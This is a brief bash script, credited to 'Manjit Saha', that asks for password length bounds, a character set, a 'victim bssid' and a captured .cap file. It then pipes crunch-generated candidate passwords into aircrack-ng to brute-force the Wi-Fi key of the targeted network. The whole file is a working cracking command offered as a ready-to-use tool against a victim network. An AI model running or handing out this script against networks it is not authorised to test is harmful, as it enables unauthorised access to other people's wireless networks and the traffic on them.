#!/bin/bash

echo "-----Tool Created By Manjit Saha-----"

read -p "Enter Minimun No. " A
read -p "Enter Maximum No. " B
read -p "Enter your combination: " C
read -p "Enter victim bssid: " D
read -p "Enter path of the .cap file: " E
 
crunch $A $B $C|aircrack-ng --bssid $D -w- $E


echo "    -------------------------------------------------"
echo "    -------------------------------------------------"
echo "    -------------------------------------------------"
echo "       -----Tool Created By Manjit Saha-----"
echo "    -------------------------------------------------"
echo "    -------------------------------------------------"
echo "    -------------------------------------------------"
